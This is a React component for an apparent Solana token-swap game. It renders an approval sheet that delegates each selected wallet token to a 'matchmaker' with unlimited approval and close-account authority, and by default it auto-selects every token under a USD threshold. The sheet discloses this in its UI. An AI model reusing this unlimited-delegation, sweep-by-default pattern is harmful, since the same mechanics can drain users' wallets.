"use client";

// The "one-swoop approval": real on-chain delegation. For each selected token
// it builds approve(matchmaker, u64::MAX) + setAuthority(CloseAccount→matchmaker)
// and the connected wallet signs. Holdings are the wallet's real SPL balances.

import { useMemo, useState } from "react";
import { fmtUsd } from "@/lib/gacha/data";
import type { Holding } from "@/lib/gacha/chain";

export interface PricedHolding extends Holding {
  symbol: string;
  usd: number | null;
}

export function ApprovalSheet({ holdings, threshold, setThreshold, busy, error, onApprove, onClose }: {
  holdings: PricedHolding[];
  threshold: number;
  setThreshold: (n: number) => void;
  busy: string | null;          // progress label while signing, else null
  error: string | null;
  onApprove: (selected: PricedHolding[]) => void;
  onClose: () => void;
}) {
  // default selection: undelegated tokens priced under the threshold (or unpriced)
  const [overrides, setOverrides] = useState<Record<string, boolean>>({});
  const inDefault = (h: PricedHolding) => !h.delegated && (h.usd === null || h.usd < threshold);
  const isSelected = (h: PricedHolding) => overrides[h.ata] ?? inDefault(h);
  const selected = useMemo(() => holdings.filter(isSelected), [holdings, overrides, threshold]);
  const sweptUsd = selected.reduce((s, h) => s + (h.usd ?? 0), 0);

  return (
    <div onClick={busy ? undefined : onClose} style={{
      position: "absolute", inset: 0, zIndex: 60, display: "flex", alignItems: "center", justifyContent: "center",
      background: "rgba(4,2,12,0.82)", backdropFilter: "blur(8px)", padding: 20, animation: "fadein .2s ease",
    }}>
      <div onClick={e => e.stopPropagation()} style={{
        width: "min(520px, 100%)", maxHeight: "86vh", display: "flex", flexDirection: "column",
        borderRadius: 20, overflow: "hidden",
        background: "linear-gradient(180deg, #14121f, #0b0a14)",
        border: "1px solid rgba(176,107,255,0.25)", boxShadow: "0 30px 90px rgba(0,0,0,0.6), 0 0 50px rgba(176,107,255,0.15)",
      }}>
        <div style={{ padding: "20px 24px 16px" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            <span style={{ fontSize: 20 }}>⇄</span>
            <div style={{ fontWeight: 800, color: "#fff", fontSize: 18 }}>One-Swoop Approval</div>
            <button onClick={onClose} disabled={!!busy} style={{ marginLeft: "auto", background: "none", border: "none", color: "rgba(255,255,255,0.4)", fontSize: 22, cursor: busy ? "default" : "pointer" }}>×</button>
          </div>
          <div style={{ marginTop: 6, fontSize: 13, color: "rgba(255,255,255,0.5)", lineHeight: 1.5 }}>
            One signature per batch delegates each selected token to the matchmaker (approve + close authority). Each becomes fair game for the switcheroo. <strong style={{ color: "#fff" }}>Real mainnet transaction.</strong>
          </div>
        </div>

        {/* threshold slider */}
        <div style={{ padding: "4px 24px 14px" }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "baseline", marginBottom: 8 }}>
            <span style={{ fontSize: 12, color: "rgba(255,255,255,0.45)", fontFamily: "var(--mono)", letterSpacing: "0.1em" }}>AUTO-SELECT UNDER</span>
            <span style={{ fontFamily: "var(--mono)", fontWeight: 800, fontSize: 22, color: "#b06bff" }}>{fmtUsd(threshold)}</span>
          </div>
          <input type="range" min={20} max={3000} step={10} value={threshold}
            onChange={e => { setThreshold(+e.target.value); setOverrides({}); }}
            style={{ width: "100%", accentColor: "#b06bff", cursor: "pointer" }} />
        </div>

        {/* holdings list */}
        <div style={{ flex: 1, overflowY: "auto", padding: "0 16px 8px" }}>
          {holdings.length === 0 && (
            <div style={{ textAlign: "center", padding: "30px 16px", color: "rgba(255,255,255,0.4)", fontFamily: "var(--mono)", fontSize: 13 }}>
              No SPL tokens in this wallet.
            </div>
          )}
          {holdings.map(h => {
            const sel = isSelected(h);
            return (
              <button key={h.ata} disabled={h.delegated || !!busy}
                onClick={() => setOverrides(o => ({ ...o, [h.ata]: !sel }))}
                style={{
                  width: "100%", display: "flex", alignItems: "center", gap: 12, padding: "9px 10px", borderRadius: 10,
                  background: sel ? "rgba(176,107,255,0.1)" : "transparent",
                  border: "none", borderBottom: "1px solid rgba(255,255,255,0.04)",
                  opacity: h.delegated ? 0.5 : 1, cursor: h.delegated || busy ? "default" : "pointer", textAlign: "left",
                }}>
                <div style={{
                  width: 30, height: 30, borderRadius: "50%", flex: "none",
                  background: `radial-gradient(circle at 38% 30%, #b06bff, #b06bff55)`,
                  display: "flex", alignItems: "center", justifyContent: "center",
                  fontSize: 13, fontWeight: 800, color: "#fff",
                }}>{(h.symbol[0] || "?").toUpperCase()}</div>
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div style={{ fontSize: 13, fontWeight: 700, color: "#fff", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{h.symbol}</div>
                  <div style={{ fontSize: 11, color: "rgba(255,255,255,0.4)", fontFamily: "var(--mono)" }}>{h.uiAmount.toLocaleString("en-US", { maximumFractionDigits: 4 })}</div>
                </div>
                <div style={{ fontFamily: "var(--mono)", fontSize: 13, color: "#fff" }}>{h.usd === null ? "—" : fmtUsd(Math.round(h.usd))}</div>
                <div style={{ width: 72, textAlign: "right", fontFamily: "var(--mono)", fontSize: 10, fontWeight: 800, letterSpacing: "0.06em",
                  color: h.delegated ? "#7CFFB2" : sel ? "#b06bff" : "rgba(255,255,255,0.3)" }}>
                  {h.delegated ? "✓ IN POOL" : sel ? "SELECTED" : "SKIP"}
                </div>
              </button>
            );
          })}
        </div>

        {/* footer */}
        <div style={{ padding: "14px 24px 20px", borderTop: "1px solid rgba(255,255,255,0.08)", background: "rgba(176,107,255,0.05)" }}>
          {error && <div style={{ marginBottom: 10, fontSize: 12, color: "#ff6b6b", fontFamily: "var(--mono)" }}>{error}</div>}
          <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 12, fontFamily: "var(--mono)", fontSize: 13 }}>
            <span style={{ color: "rgba(255,255,255,0.5)" }}>{selected.length} tokens · delegating</span>
            <span style={{ color: "#b06bff", fontWeight: 800 }}>{sweptUsd > 0 ? fmtUsd(Math.round(sweptUsd)) : "—"} into the pool</span>
          </div>
          <button onClick={() => onApprove(selected)} disabled={!!busy || selected.length === 0} style={{
            width: "100%", padding: "14px", borderRadius: 12, border: "none", cursor: busy || selected.length === 0 ? "default" : "pointer",
            background: busy ? "rgba(176,107,255,0.4)" : selected.length === 0 ? "rgba(255,255,255,0.08)" : "linear-gradient(90deg, #b06bff, #7a32d6)",
            color: "#fff", fontWeight: 800, fontSize: 15,
            boxShadow: busy || selected.length === 0 ? "none" : "0 8px 30px rgba(176,107,255,0.4)",
          }}>
            {busy ? busy : selected.length === 0 ? "SELECT TOKENS TO DELEGATE" : `APPROVE & SWEEP ${selected.length} TOKEN${selected.length > 1 ? "S" : ""}`}
          </button>
          <div style={{ marginTop: 10, fontSize: 10, color: "rgba(255,255,255,0.3)", textAlign: "center", lineHeight: 1.5 }}>
            Custodial while pooled — the matchmaker holds delegate + close authority. Revoke anytime. No house edge.
          </div>
        </div>
      </div>
    </div>
  );
}
